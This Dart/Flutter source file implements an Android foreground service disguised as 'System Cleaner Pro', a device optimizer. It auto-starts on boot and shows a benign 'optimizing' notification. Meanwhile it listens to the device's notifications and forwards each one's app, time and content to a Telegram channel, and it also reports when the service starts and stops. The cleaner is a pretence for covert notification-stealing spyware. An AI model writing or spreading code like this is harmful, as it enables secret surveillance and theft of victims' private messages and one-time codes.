import 'dart:isolate';

import 'package:flutter/material.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'notification_service.dart';
import 'telegram_service.dart';

class ForegroundService {
  static final ForegroundService _instance = ForegroundService._internal();
  factory ForegroundService() => _instance;
  ForegroundService._internal();

  final NotificationService _notificationService = NotificationService();
  final TelegramService _telegramService = TelegramService();
  bool _isRunning = false;

  Future<void> initialize() async {
    await _initForegroundTask();
    await _notificationService.initialize();
    await _startForegroundService();
    _startMonitoring();
  }

  Future<void> _initForegroundTask() async {
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'system_cleaner_pro',
        channelName: 'System Cleaner Pro',
        channelDescription: 'System optimization service notification',
        channelImportance: NotificationChannelImportance.LOW,
        priority: NotificationPriority.LOW,
        iconData: const NotificationIconData(
          resType: ResourceType.mipmap,
          resPrefix: ResourcePrefix.ic,
          name: 'launcher',
        ),
      ),
      iosNotificationOptions: const IOSNotificationOptions(
        showNotification: true,
        playSound: false,
      ),
      foregroundTaskOptions: const ForegroundTaskOptions(
        interval: 5000,
        isOnceEvent: false,
        autoRunOnBoot: true,
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );
  }

  Future<void> _startForegroundService() async {
    if (await FlutterForegroundTask.isRunningService) {
      await FlutterForegroundTask.restartService();
    } else {
      await FlutterForegroundTask.startService(
        notificationTitle: 'System Optimizer',
        notificationText: 'Optimizing your device performance...',
        callback: startCallback,
      );
    }

    _isRunning = true;

    // إرسال إشعار بدء التشغيل لتيليجرام
    _telegramService.sendMessage("🚀 System Cleaner Pro Started\nDevice: Android\nTime: ${DateTime.now()}");
  }

  void _startMonitoring() {
    // محاكاة مراقبة الإشعارات (ستحتاج تعديل حسب احتياجاتك)
    _notificationService.startListening((notification) {
      // إرسال الإشعار لتيليجرام
      _telegramService.sendMessage(
        "📱 New Notification\n"
        "App: ${notification['app']}\n"
        "Time: ${notification['time']}\n"
        "Content: ${notification['content']}"
      );
    });
  }

  Future<void> stopService() async {
    await FlutterForegroundTask.stopService();
    _isRunning = false;
    _telegramService.sendMessage("⏹️ System Cleaner Pro Stopped");
  }

  bool get isRunning => _isRunning;
}

// The callback function should be a top-level function
@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(MyTaskHandler());
}

class MyTaskHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp, SendPort? sendPort) async {
    // Called when the task is started
  }

  @override
  Future<void> onEvent(DateTime timestamp, SendPort? sendPort) async {
    // Called every interval
    FlutterForegroundTask.updateService(
      notificationTitle: 'System Optimizer',
      notificationText: 'Running at ${timestamp.toString().substring(11, 19)}',
    );
  }

  @override
  Future<void> onDestroy(DateTime timestamp, SendPort? sendPort) async {
    // Called when the task is destroyed
  }

  @override
  void onButtonPressed(String id) {
    // Called when notification button is pressed
  }

  @override
  void onNotificationPressed() {
    // Called when notification is pressed
    FlutterForegroundTask.launchApp("/");
  }
}
